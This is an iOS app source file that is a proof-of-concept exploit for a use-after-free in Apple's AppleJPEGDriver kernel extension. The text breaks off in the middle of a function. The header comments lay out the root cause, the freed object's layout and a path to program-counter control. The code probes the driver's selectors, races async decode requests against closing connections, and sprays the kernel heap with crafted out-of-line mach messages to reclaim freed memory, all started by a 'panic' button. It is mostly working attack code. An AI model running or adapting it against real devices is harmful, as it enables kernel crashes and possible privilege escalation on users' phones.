//
//  ViewController.m
//  Test
//
//  PoC: AppleJPEGDriver use-after-free + retain leak
//
//  Bug class: Use-After-Free (CWE-416) in AppleJPEGDriver kernel extension
//  Tested on: iPhone 16 Pro (iPhone18,2), iOS 26.3 (23D125)
//  Impact: kernel panic (DoS), potential code execution
//
//  Root cause:
//    When async JPEG decode requests are in-flight and the client closes,
//    terminatePhase1 sets isInactive() via arbitration lock (NOT command-gated).
//    finish_io_gated sees isInactive=true → skips taggedRelease → retain leak.
//    The freed JpegRequest's pointer remains in the queue at self+192.
//    Subsequent HW completions → fullSpeedRequestExist walks stale queue →
//    dereferences freed memory → MTE tag check fault → kernel panic.
//
//  UAF object: JpegRequest (0x440 = 1088 bytes, pool/zone-allocated)
//    +0x00: task_t             ← vtable-like deref: *(*(req+0)+40)() = PC control
//    +0x08: IOUserClient*
//    +0x78: queue link node (embedded, enqueued at driver self+192)
//    +0x80: self-pointer (set by queue_io_gated) ← FIRST UAF read
//    +0x310: flags byte (bit0=progressive)       ← SECOND UAF read
//
//  Crash path: interruptOccurred_gated → finish_io_gated → fullSpeedRequestExist
//    LDR X8, [X23]     ; load from queue vector → &request[120]
//    LDR X8, [X8, #8]  ; load request+128 (self-ptr) → FAULT (freed/MTE tagged)
//
//  Confirmed via kernel panic: "Kernel tag check fault" with FEEDFACE poison
//  in registers (x5=x6=0xfeedfacefeedfad3), PC inside AppleJPEGDriver.
//

#import "ViewController.h"
#import <IOSurface/IOSurfaceRef.h>
#import <mach/mach.h>

// IOKit function declarations (not in public iOS headers)
typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
typedef io_object_t io_iterator_t;

extern const mach_port_t kIOMainPortDefault;

kern_return_t IOServiceGetMatchingServices(mach_port_t mainPort,
                                           CFDictionaryRef matching,
                                           io_iterator_t *existing);
io_object_t   IOIteratorNext(io_iterator_t iterator);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask,
                            uint32_t type, io_connect_t *connect);
kern_return_t IOServiceClose(io_connect_t connect);
kern_return_t IOObjectRelease(io_object_t object);
kern_return_t IOConnectSetNotificationPort(io_connect_t connect,
                                           uint32_t type,
                                           mach_port_t port,
                                           uintptr_t reference);
kern_return_t IOConnectCallStructMethod(io_connect_t connect,
                                        uint32_t selector,
                                        const void *inputStruct,
                                        size_t inputStructCnt,
                                        void *outputStruct,
                                        size_t *outputStructCnt);
kern_return_t IOConnectCallMethod(io_connect_t connect,
                                  uint32_t selector,
                                  const uint64_t *input,
                                  uint32_t inputCnt,
                                  const void *inputStruct,
                                  size_t inputStructCnt,
                                  uint64_t *output,
                                  uint32_t *outputCnt,
                                  void *outputStruct,
                                  size_t *outputStructCnt);
CFMutableDictionaryRef IOServiceMatching(const char *name);

// AppleJPEGDriverIOStruct: 0x58 (88) bytes
// Reverse-engineered from startDecoder (sub_FFFFFE00096470A4) and
// setupBuffersForCoding_gated (sub_FFFFFE00096463A0)
//
// Field mapping verified via disassembly:
//   input+0x00 -> request+684  (source surface ID, used by IOSurfaceRoot::lookupSurface)
//   input+0x04 -> request+580  (JPEG input file size; validated >= 7 on T8010, ignored on A18)
//   input+0x08 -> request+688  (dest surface ID, LDR W23,[X1,#0x2B0])
//   input+0x0C -> request+584  (output buffer size; validated >= 7 on T8010, ignored on A18)
//   input+0x14 -> request+808  (width, via OWORD copy from a2+20)
//   input+0x18 -> request+812  (height, read as uint32)
//   input+0x20 -> request+784  (flags byte: bit0=progressive)
//   input+0x24 -> request+848  (xy offsets, 8 bytes)
//   input+0x2C -> request+836/840 (subsampling mode switch)
//   input+0x30 -> request+16   (async token, 16 bytes)
//   input+0x40 -> request+32   (8 bytes)
//   input+0x48 -> request+1056 (codec ID)
//   input+0x4C -> request+892  (output width, compared in fast-path check)
//   input+0x50 -> request+896  (output height, compared in fast-path check)
typedef struct __attribute__((packed)) {
    uint32_t sourceID;       // +0x00: source IOSurface ID (JPEG data)
    uint32_t field_04;       // +0x04: JPEG input file size (validated >= 7 on T8010)
    uint32_t destID;         // +0x08: dest IOSurface ID (pixel output)
    uint32_t field_0C;       // +0x0C: output buffer size (validated >= 7 on T8010)
    uint32_t field_10;       // +0x10: unknown (try 0)
    uint32_t width;          // +0x14: pixel width
    uint32_t height;         // +0x18: pixel height (full uint32, NOT uint16)
    uint32_t field_1C;       // +0x1C: not read by startDecoder
    uint8_t  flags;          // +0x20: bit0=progressive, bit1=?, bit2=?
    uint8_t  pad_21[3];      // +0x21: padding
    uint32_t xOffset;        // +0x24: x offset
    uint32_t yOffset;        // +0x28: y offset
    uint32_t subsampling;    // +0x2C: 0=444, 1=422, 3=420, 4=411
    uint64_t asyncToken;     // +0x30: non-zero = async mode
    uint64_t asyncToken2;    // +0x38: async reference 2
    uint64_t field_40;       // +0x40: unknown
    uint32_t codecID;        // +0x48: codec identifier
    uint32_t outWidth;       // +0x4C: output width (fast-path check)
    uint32_t outHeight;      // +0x50: output height (fast-path check)
    uint32_t field_54;       // +0x54: extra
} AppleJPEGDriverIOStruct;

_Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
               "AppleJPEGDriverIOStruct must be 88 bytes");

@interface ViewController ()
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) UIButton *panicButton;
@property (nonatomic, strong) UILabel *statusLabel;
@property (nonatomic, assign) BOOL running;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.blackColor;

    // Panic button (image)
    self.panicButton = [UIButton buttonWithType:UIButtonTypeCustom];
    UIImage *btnImg = [UIImage imageNamed:@"PanicButton"];
    [self.panicButton setImage:btnImg forState:UIControlStateNormal];
    self.panicButton.imageView.contentMode = UIViewContentModeScaleAspectFit;
    self.panicButton.contentHorizontalAlignment = UIControlContentHorizontalAlignmentFill;
    self.panicButton.contentVerticalAlignment = UIControlContentVerticalAlignmentFill;
    self.panicButton.translatesAutoresizingMaskIntoConstraints = NO;
    [self.panicButton addTarget:self action:@selector(panicPressed) forControlEvents:UIControlEventTouchUpInside];

    // Status label
    self.statusLabel = [[UILabel alloc] init];
    self.statusLabel.text = @"";
    self.statusLabel.font = [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightRegular];
    self.statusLabel.textColor = [UIColor colorWithRed:0.0 green:1.0 blue:0.0 alpha:1.0];
    self.statusLabel.textAlignment = NSTextAlignmentCenter;
    self.statusLabel.numberOfLines = 0;
    self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;

    // Hidden log view (still captures NSLog output for debugging)
    self.logView = [[UITextView alloc] init];
    self.logView.editable = NO;
    self.logView.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;
    self.logView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1.0];
    self.logView.textColor = [UIColor colorWithRed:0.0 green:1.0 blue:0.0 alpha:1.0];
    self.logView.layer.cornerRadius = 8;
    self.logView.alpha = 0;

    [self.view addSubview:self.panicButton];
    [self.view addSubview:self.statusLabel];
    [self.view addSubview:self.logView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [self.panicButton.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
        [self.panicButton.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor constant:-40],
        [self.panicButton.widthAnchor constraintEqualToConstant:260],
        [self.panicButton.heightAnchor constraintEqualToConstant:260],
        [self.statusLabel.topAnchor constraintEqualToAnchor:self.panicButton.bottomAnchor constant:30],
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:20],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-20],
        [self.logView.topAnchor constraintEqualToAnchor:self.statusLabel.bottomAnchor constant:12],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-12],
    ]];
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleLightContent;
}

- (void)panicPressed {
    if (self.running) return;

    // Animate button press
    [UIView animateWithDuration:0.1 animations:^{
        self.panicButton.transform = CGAffineTransformMakeScale(0.9, 0.9);
    } completion:^(BOOL finished) {
        [UIView animateWithDuration:0.1 animations:^{
            self.panicButton.transform = CGAffineTransformIdentity;
        }];
    }];

    // Show log area
    [UIView animateWithDuration:0.3 animations:^{
        self.logView.alpha = 1.0;
    }];

    [self setStatus:@"Spraying..."];
    [self sprayLeak:1000];
}

#pragma mark - Status

- (void)setStatus:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.statusLabel.text = text;
    });
}

#pragma mark - Logging

- (void)log:(NSString *)fmt, ... NS_FORMAT_FUNCTION(1,2) {
    va_list args;
    va_start(args, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);

    NSLog(@"[PoC] %@", msg);

    dispatch_async(dispatch_get_main_queue(), ^{
        self.logView.text = [self.logView.text stringByAppendingFormat:@"%@\n", msg];
        NSRange bottom = NSMakeRange(self.logView.text.length - 1, 1);
        [self.logView scrollRangeToVisible:bottom];
    });
}

#pragma mark - Memory measurement

- (int64_t)wiredMemoryPages {
    vm_statistics64_data_t vmstat;
    mach_msg_type_number_t count = HOST_VM_INFO64_COUNT;
    if (host_statistics64(mach_host_self(), HOST_VM_INFO64,
                          (host_info64_t)&vmstat, &count) != KERN_SUCCESS)
        return -1;
    return (int64_t)vmstat.wire_count;
}

// Process-specific physical footprint (less noisy than system-wide wired pages).
// Returns bytes charged to this task (includes IOSurface wired pages).
- (int64_t)taskPhysFootprint {
    task_vm_info_data_t info;
    mach_msg_type_number_t count = TASK_VM_INFO_COUNT;
    if (task_info(mach_task_self(), TASK_VM_INFO,
                  (task_info_t)&info, &count) != KERN_SUCCESS)
        return -1;
    return (int64_t)info.phys_footprint;
}

#pragma mark - IOKit helpers

- (io_service_t)findJPEGService {
    CFMutableDictionaryRef matching = IOServiceMatching("AppleJPEGDriver");
    if (!matching) {
        [self log:@"IOServiceMatching failed"];
        return 0;
    }
    io_iterator_t iter = 0;
    kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault, matching, &iter);
    if (kr != KERN_SUCCESS || !iter) {
        [self log:@"IOServiceGetMatchingServices: 0x%x", kr];
        return 0;
    }
    io_service_t service = IOIteratorNext(iter);
    IOObjectRelease(iter);
    return service;
}

- (io_connect_t)openUC:(io_service_t)service {
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS) {
        [self log:@"IOServiceOpen: 0x%x", kr];
        return 0;
    }
    return conn;
}

#pragma mark - IOSurface helpers

// Create an IOSurface to hold JPEG compressed data (source buffer)
- (IOSurfaceRef)createSourceSurface:(NSData *)jpegData {
    // Source surface: 1D byte buffer large enough for JPEG data
    // Use a 1-byte-per-element surface with width = data length, height = 1
    size_t len = jpegData.length;
    // Round up to page size for DART alignment
    size_t allocLen = (len + 0x3FFF) & ~0x3FFFUL;
    NSDictionary *props = @{
        (id)kIOSurfaceWidth:           @(allocLen),
        (id)kIOSurfaceHeight:          @1,
        (id)kIOSurfaceBytesPerElement: @1,
        (id)kIOSurfacePixelFormat:     @0x20202020, // '    ' (raw bytes)
    };
    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!surf) return NULL;

    // Copy JPEG data into the surface
    IOSurfaceLock(surf, 0, NULL);
    void *base = IOSurfaceGetBaseAddress(surf);
    memcpy(base, jpegData.bytes, jpegData.length);
    IOSurfaceUnlock(surf, 0, NULL);

    return surf;
}

// Create an IOSurface for decoded pixel output (dest buffer)
- (IOSurfaceRef)createDestSurface:(uint32_t)w height:(uint32_t)h {
    NSDictionary *props = @{
        (id)kIOSurfaceWidth:           @(w),
        (id)kIOSurfaceHeight:          @(h),
        (id)kIOSurfaceBytesPerElement: @4,
        (id)kIOSurfacePixelFormat:     @0x42475241, // 'BGRA'
    };
    return IOSurfaceCreate((__bridge CFDictionaryRef)props);
}

#pragma mark - JPEG data helper

- (NSData *)createTestJPEG:(int)width height:(int)height {
    UIGraphicsBeginImageContext(CGSizeMake(width, height));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, width, height));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return UIImageJPEGRepresentation(img, 0.9);
}

#pragma mark - Probe

- (void)probeDriver {
    [self log:@"--- Probing AppleJPEGDriver ---"];

    io_service_t svc = [self findJPEGService];
    if (!svc) {
        [self log:@"AppleJPEGDriver service not found"];
        return;
    }
    [self log:@"Found service: 0x%x", svc];

    io_connect_t conn = [self openUC:svc];
    IOObjectRelease(svc);
    if (!conn) {
        [self log:@"Failed to open UserClient"];
        return;
    }
    [self log:@"Opened UserClient: 0x%x", conn];

    // --- Phase 1: Baseline selector probe (no surfaces needed) ---
    // Dispatch table (IOUserClient2022, 10 entries @ 40 bytes each):
    //   Sel 0: getTarget      - no args
    //   Sel 1: decode         - structIn=0x58 structOut=0x58
    //   Sel 2: query          - no args
    //   Sel 3: encode         - structIn=0x58 structOut=0x58
    //   Sel 4: ???            - structIn=0x1000 structOut=0x1000
    //   Sel 5: ???            - structIn=0x1000 structOut=0x1000
    //   Sel 6: async decode   - structIn=0xDA0 structOut=0xDA0 allowAsync=1
    //   Sel 7: async encode   - structIn=0xDA0 structOut=0xDA0 allowAsync=1
    //   Sel 8: privileged     - structIn=4
    //   Sel 9: privileged     - no args

    // Test selector 0 (getTarget) - no args required
    kern_return_t kr = IOConnectCallMethod(conn, 0, NULL, 0, NULL, 0,
                                           NULL, NULL, NULL, NULL);
    [self log:@"Sel 0 (getTarget, no args): 0x%x", kr];

    // Test selector 2 (query) - no args required
    kr = IOConnectCallMethod(conn, 2, NULL, 0, NULL, 0,
                             NULL, NULL, NULL, NULL);
    [self log:@"Sel 2 (query, no args): 0x%x", kr];

    // Test selector 9 (privileged, no args) - expect kIOReturnNotPrivileged
    kr = IOConnectCallMethod(conn, 9, NULL, 0, NULL, 0,
                             NULL, NULL, NULL, NULL);
    [self log:@"Sel 9 (privileged, no args): 0x%x", kr];

    // Test out-of-range selector
    kr = IOConnectCallMethod(conn, 10, NULL, 0, NULL, 0,
                             NULL, NULL, NULL, NULL);
    [self log:@"Sel 10 (out of range): 0x%x", kr];

    // No notification port (SIGKILL on some devices via EXC_GUARD)

    // --- Phase 2: Create surfaces ---
    const uint32_t W = 64, H = 64;
    NSData *jpegData = [self createTestJPEG:W height:H];
    [self log:@"JPEG data: %lu bytes", (unsigned long)jpegData.length];

    IOSurfaceRef srcSurf = [self createSourceSurface:jpegData];
    IOSurfaceRef dstSurf = [self createDestSurface:W height:H];
    if (!srcSurf || !dstSurf) {
        [self log:@"IOSurface creation failed (src=%p dst=%p)", srcSurf, dstSurf];
        IOServiceClose(conn);
        if (srcSurf) CFRelease(srcSurf);
        if (dstSurf) CFRelease(dstSurf);
        return;
    }
    uint32_t srcID = IOSurfaceGetID(srcSurf);
    uint32_t dstID = IOSurfaceGetID(dstSurf);
    [self log:@"Source IOSurface ID: %u (alloc: %zu)", srcID, IOSurfaceGetAllocSize(srcSurf)];
    [self log:@"Dest IOSurface ID: %u (alloc: %zu)", dstID, IOSurfaceGetAllocSize(dstSurf)];

    // --- Phase 4: Decode tests using SELECTOR 1 (not 0!) ---
    AppleJPEGDriverIOStruct input = {0};
    AppleJPEGDriverIOStruct output = {0};
    size_t outSize;

    // Test: zeroed struct, sync (selector 1 = decode, structIn/Out = 0x58)
    outSize = sizeof(output);
    kr = IOConnectCallStructMethod(conn, 1, &input, sizeof(input),
                                   &output, &outSize);
    [self log:@"Sel 1 (decode, zeroed struct): 0x%x", kr];

    // Test: valid surfaces, sync mode
    memset(&input, 0, sizeof(input));
    input.sourceID    = srcID;
    input.destID      = dstID;
    input.width       = W;
    input.height      = H;
    input.subsampling = 0; // YUV444
    outSize = sizeof(output);
    kr = IOConnectCallStructMethod(conn, 1, &input, sizeof(input),
                                   &output, &outSize);
    [self log:@"Sel 1 (decode, surfaces sync): 0x%x", kr];

    // Test: async via struct token (IOKit sync call, driver-level async)
    memset(&input, 0, sizeof(input));
    input.sourceID    = srcID;
    input.destID      = dstID;
    input.width       = W;
    input.height      = H;
    input.outWidth    = W;
    input.outHeight   = H;
    input.subsampling = 0;
    input.asyncToken  = 0x4141; // non-zero = driver-internal async
    outSize = sizeof(output);
    kr = IOConnectCallStructMethod(conn, 1, &input, sizeof(input),
                                   &output, &outSize);
    [self log:@"Sel 1 (decode, async token): 0x%x", kr];

    // Test: YUV420 subsampling
    memset(&input, 0, sizeof(input));
    input.sourceID    = srcID;
    input.destID      = dstID;
    input.width       = W;
    input.height      = H;
    input.outWidth    = W;
    input.outHeight   = H;
    input.subsampling = 3; // YUV420
    input.asyncToken  = 0x4141;
    outSize = sizeof(output);
    kr = IOConnectCallStructMethod(conn, 1, &input, sizeof(input),
                                   &output, &outSize);
    [self log:@"Sel 1 (decode, YUV420 async): 0x%x", kr];

    // Test: selector 3 (encode) with same struct
    memset(&input, 0, sizeof(input));
    input.sourceID    = dstID; // swap: source is pixel data
    input.destID      = srcID; // dest is JPEG output
    input.width       = W;
    input.height      = H;
    input.outWidth    = W;
    input.outHeight   = H;
    input.subsampling = 3;
    outSize = sizeof(output);
    kr = IOConnectCallStructMethod(conn, 3, &input, sizeof(input),
                                   &output, &outSize);
    [self log:@"Sel 3 (encode, sync): 0x%x", kr];

    // Dump output struct
    [self log:@"Output: %08x %08x %08x %08x %08x %08x",
        output.sourceID, output.field_04, output.destID,
        output.field_0C, output.field_10, output.width];

    IOServiceClose(conn);
    CFRelease(srcSurf);
    CFRelease(dstSurf);
    [self log:@"Probe done."];
}

#pragma mark - Driver health check

// Quick check: open a connection, call selector 2 (query), close.
// Returns YES if driver is responsive, NO if broken/hung.
- (BOOL)checkDriverHealth:(io_service_t)svc {
    io_connect_t conn = [self openUC:svc];
    if (!conn) return NO;
    kern_return_t kr = IOConnectCallMethod(conn, 2, NULL, 0, NULL, 0,
                                           NULL, NULL, NULL, NULL);
    IOServiceClose(conn);
    return (kr == KERN_SUCCESS);
}

#pragma mark - Single leak test

- (void)singleLeakTest {
    [self log:@"--- Single Leak Test (multi-request) ---"];

    io_service_t svc = [self findJPEGService];
    if (!svc) { [self log:@"Service not found"]; return; }

    BOOL healthy = [self checkDriverHealth:svc];
    [self log:@"Driver health: %@", healthy ? @"OK" : @"BROKEN"];
    if (!healthy) {
        [self log:@"Driver broken - reboot needed"];
        IOObjectRelease(svc);
        return;
    }

    io_connect_t conn = [self openUC:svc];
    if (!conn) { IOObjectRelease(svc); [self log:@"Failed to open UC"]; return; }

    // No notification port (SIGKILL on some devices via EXC_GUARD)

    const uint32_t W = 2048, H = 2048;
    NSData *jpegData = [self createTestJPEG:W height:H];
    IOSurfaceRef srcSurf = [self createSourceSurface:jpegData];
    IOSurfaceRef dstSurf = [self createDestSurface:W height:H];
    if (!srcSurf || !dstSurf) {
        [self log:@"Surface creation failed"];
        IOServiceClose(conn);
        if (srcSurf) CFRelease(srcSurf);
        if (dstSurf) CFRelease(dstSurf);
        IOObjectRelease(svc);
        return;
    }
    uint32_t srcID = IOSurfaceGetID(srcSurf);
    uint32_t dstID = IOSurfaceGetID(dstSurf);
    [self log:@"src=%u dst=%u jpeg=%lu bytes", srcID, dstID, (unsigned long)jpegData.length];

    int64_t wiredBefore = [self wiredMemoryPages];

    // Strategy: submit N async decode requests on one connection.
    // Each request causes queue_io_gated to call taggedRetain on the UC.
    // Then IOServiceClose → terminatePhase1 → isInactive (set EARLY,
    // before command gate is acquired for clientClosedGated).
    // Hardware jobs still in-flight → finish_io_gated → sees isInactive
    // → skips taggedRelease → leaked retain per in-flight job.
    const int N = 5;
    int submitted = 0;
    for (int j = 0; j < N; j++) {
        AppleJPEGDriverIOStruct input = {0};
        AppleJPEGDriverIOStruct output = {0};
        input.sourceID    = srcID;
        input.field_04    = W * H;
        input.destID      = dstID;
        input.field_0C    = W * H * 4;
        input.width       = W;
        input.height      = H;
        input.outWidth    = W;
        input.outHeight   = H;
        input.subsampling = 3;
        input.asyncToken  = 0x4141 + j;

        size_t outSize = sizeof(output);
        kern_return_t kr = IOConnectCallStructMethod(conn, 1, &input, sizeof(input),
                                       &output, &outSize);
        if (kr != KERN_SUCCESS) {
            [self log:@"Submit %d: 0x%x (pool limit?)", j, kr];
            break;
        }
        submitted++;
    }
    [self log:@"Submitted %d async requests (each = +1 taggedRetain)", submitted];

    // Close immediately → terminatePhase1 → isInactive (set early)
    // In-flight HW jobs → finish_io_gated → isInactive → skip taggedRelease
    IOServiceClose(conn);
    [self log:@"Connection closed"];

    usleep(500000); // 500ms for HW to drain

    int64_t wiredAfter = [self wiredMemoryPages];
    vm_size_t pageSize = 0;
    host_page_size(mach_host_self(), &pageSize);
    [self log:@"Wired delta: %+lld pages (%+lld KB)",
        wiredAfter - wiredBefore,
        (wiredAfter - wiredBefore) * (int64_t)pageSize / 1024];

    healthy = [self checkDriverHealth:svc];
    [self log:@"Driver health after: %@", healthy ? @"OK" : @"BROKEN"];

    CFRelease(srcSurf);
    CFRelease(dstSurf);
    IOObjectRelease(svc);
    [self log:@"Done."];
}

#pragma mark - UAF characterization

// Submit N async decode requests on a connection, return count submitted.
- (int)submitAsyncRequests:(io_connect_t)conn
                    srcID:(uint32_t)srcID dstID:(uint32_t)dstID
                    width:(uint32_t)W height:(uint32_t)H
                    count:(int)N tokenBase:(uint64_t)tokenBase
{
    int submitted = 0;
    for (int j = 0; j < N; j++) {
        AppleJPEGDriverIOStruct input = {0};
        AppleJPEGDriverIOStruct output = {0};
        input.sourceID    = srcID;
        input.field_04    = W * H;     // JPEG input size hint (validated on T8010)
        input.destID      = dstID;
        input.field_0C    = W * H * 4; // output buffer size (must be >= 7 on T8010)
        input.width       = W;
        input.height      = H;
        input.outWidth    = W;
        input.outHeight   = H;
        input.subsampling = 3;
        input.asyncToken  = tokenBase + j;
        size_t outSize = sizeof(output);
        kern_return_t kr = IOConnectCallStructMethod(conn, 1,
            &input, sizeof(input), &output, &outSize);
        if (kr != KERN_SUCCESS) break;
        submitted++;
    }
    return submitted;
}

// Open a connection for async decode.
// No notification port — triggers SIGKILL on some devices (EXC_GUARD).
// Decode requests succeed without it; outPort set to MACH_PORT_NULL.
- (io_connect_t)openAsyncConn:(io_service_t)svc port:(mach_port_t *)outPort {
    io_connect_t conn = [self openUC:svc];
    if (!conn) return 0;
    if (outPort) *outPort = MACH_PORT_NULL;
    return conn;
}

// Spray OOL mach_msg descriptors of exact size into kernel heap.
// Each message copies 'size' bytes into a kalloc allocation.
// On type-isolated heaps (iOS 17+), this may land in kheap_data_buffers
// instead of the JpegRequest zone — but worth trying as a secondary reclaim.
- (void)sprayOOL:(uint32_t)size count:(int)count port:(mach_port_t)port {
    uint8_t *payload = calloc(size, 1);
    if (!payload) return;

    // Fill with identifiable pattern, zero UAF-critical offsets
    memset(payload, 'J', size);
    memset(payload + 128, 0, 8);   // request+128 (self-ptr) = NULL → safe
    payload[784] = 0;              // request+784 (flags) = 0 → no crash

    for (int i = 0; i < count; i++) {
        struct {
            mach_msg_header_t          header;
            mach_msg_body_t            body;
            mach_msg_ool_descriptor_t  ool;
        } msg = {0};
        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0)
                               | MACH_MSGH_BITS_COMPLEX;
        msg.header.msgh_size = sizeof(msg);
        msg.header.msgh_remote_port = port;
        msg.body.msgh_descriptor_count = 1;
        msg.ool.address = payload;
        msg.ool.size = size;
        msg.ool.deallocate = FALSE;
        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
        mach_msg(&msg.header, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                 sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
    }
    free(payload);
}

- (void)uafCharacterize {
    if (self.running) {
        [self log:@"Already running"];
        return;
    }
    self.running = YES;

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        [self log:@"--- UAF Characterization ---"];
        [self log:@"Object: JpegRequest 0x440 (1088 bytes)"];
        [self log:@"UAF: req+128 (self-ptr) → req+784 (flags)"];
        [self log:@"Goal: reclaim freed slots before stale read"];

        io_service_t svc = [self findJPEGService];
        if (!svc) {
            [self log:@"Service not found"];
            self.running = NO;
            return;
        }

        BOOL healthy = [self checkDriverHealth:svc];
        [self log:@"Driver: %@", healthy ? @"OK" : @"BROKEN"];
        if (!healthy) {
            IOObjectRelease(svc);
            self.running = NO;
            return;
        }

        const uint32_t W = 2048, H = 2048;
        NSData *jpegData = [self createTestJPEG:W height:H];
        IOSurfaceRef srcSurf = [self createSourceSurface:jpegData];
        IOSurfaceRef dstSurf = [self createDestSurface:W height:H];
        if (!srcSurf || !dstSurf) {
            [self log:@"Surface creation failed"];
            IOObjectRelease(svc);
            if (srcSurf) CFRelease(srcSurf);
            if (dstSurf) CFRelease(dstSurf);
            self.running = NO;
            return;
        }
        uint32_t srcID = IOSurfaceGetID(srcSurf);
        uint32_t dstID = IOSurfaceGetID(dstSurf);

        vm_size_t pageSize = 0;
        host_page_size(mach_host_self(), &pageSize);
        int64_t wiredBefore = [self wiredMemoryPages];
        [self log:@"Wired: %lld pages (%lld MB)",
            wiredBefore, wiredBefore * (int64_t)pageSize / (1024*1024)];

        // ---------------------------------------------------------------
        // Phase 1: Sequential victim → reclaim cycles
        // Victim submits N async requests then closes → stale queue ptrs.
        // Reclaimer immediately submits requests → pool recycles slots →
        // fullSpeedRequestExist reads recycled data instead of FEEDFACE.
        // ---------------------------------------------------------------
        const int CYCLES = 100;
        const int V_REQS = 5;
        const int R_CONNS = 3;
        const int R_REQS = 3;
        int victimTotal = 0, reclaimTotal = 0;
        int healthOK = 0, healthTotal = 0;

        [self log:@"Phase 1: %d sequential victim→reclaim cycles", CYCLES];

        for (int c = 0; c < CYCLES && self.running; c++) {
            // Victim: submit async requests, then close
            mach_port_t vp;
            io_connect_t victim = [self openAsyncConn:svc port:&vp];
            if (!victim) continue;
            victimTotal += [self submitAsyncRequests:victim
                srcID:srcID dstID:dstID width:W height:H
                count:V_REQS tokenBase:0x4141];
            IOServiceClose(victim);

            // Reclaim: open multiple connections, submit requests
            // These JpegRequest allocs reuse freed pool slots
            for (int r = 0; r < R_CONNS; r++) {
                mach_port_t rp;
                io_connect_t rc = [self openAsyncConn:svc port:&rp];
                if (!rc) continue;
                reclaimTotal += [self submitAsyncRequests:rc
                    srcID:srcID dstID:dstID width:W height:H
                    count:R_REQS tokenBase:0xBEEF];
                IOServiceClose(rc);
            }

            // Health check every 25 cycles
            if ((c + 1) % 25 == 0) {
                usleep(200000);
                healthy = [self checkDriverHealth:svc];
                healthTotal++;
                if (healthy) healthOK++;
                int64_t delta = [self wiredMemoryPages] - wiredBefore;
                [self log:@"  [%d] %@ wired=%+lld v=%d r=%d",
                    c + 1, healthy ? @"OK" : @"BAD",
                    delta, victimTotal, reclaimTotal];
                if (!healthy) break;
            }
        }

        if (!self.running || !healthy) {
            [self log:@"Phase 1 done: %@", healthy ? @"stopped" : @"driver broken"];
        }

        // ---------------------------------------------------------------
        // Phase 2: Concurrent racing with OOL spray
        // 3 threads: victim, reclaimer (same-pool), OOL sprayer
        // Maximizes the chance of controlled reclaim vs FEEDFACE crash.
        // ---------------------------------------------------------------
        if (self.running && healthy) {
            [self log:@"Phase 2: concurrent racing (3 threads, 50 iters)"];
            const int RACE_ITERS = 50;
            __block int32_t raceV = 0, raceR = 0;

            // OOL spray port: messages accumulate, holding kalloc(0x440) alive
            mach_port_t sprayPort = MACH_PORT_NULL;
            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &sprayPort);
            mach_port_insert_right(mach_task_self(), sprayPort, sprayPort,
                                   MACH_MSG_TYPE_MAKE_SEND);

            dispatch_group_t group = dispatch_group_create();

            // Thread 1: Victim — open → submit → close (creates stale ptrs)
            dispatch_group_async(group,
                dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
                for (int i = 0; i < RACE_ITERS && self.running; i++) {
                    io_connect_t c = [self openUC:svc];
                    if (!c) continue;
                    int n = [self submitAsyncRequests:c
                        srcID:srcID dstID:dstID width:W height:H
                        count:5 tokenBase:0xDEAD];
                    IOServiceClose(c);
                    __sync_fetch_and_add(&raceV, n);
                }
            });

            // Thread 2: Reclaimer — same-pool allocs to fill freed slots
            dispatch_group_async(group,
                dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
                for (int i = 0; i < RACE_ITERS && self.running; i++) {
                    io_connect_t c = [self openUC:svc];
                    if (!c) continue;
                    int n = [self submitAsyncRequests:c
                        srcID:srcID dstID:dstID width:W height:H
                        count:5 tokenBase:0xCAFE];
                    IOServiceClose(c);
                    __sync_fetch_and_add(&raceR, n);
                }
            });

            // Thread 3: OOL spray — alternative reclaim via mach_msg
            // Sprays kalloc(0x440) with controlled data (NULL self-ptr).
            // May not hit same zone due to type isolation, but worth trying.
            dispatch_group_async(group,
                dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
                for (int i = 0; i < RACE_ITERS * 10 && self.running; i++) {
                    [self sprayOOL:0x440 count:1 port:sprayPort];
                }
            });

            dispatch_group_wait(group,
                dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC));

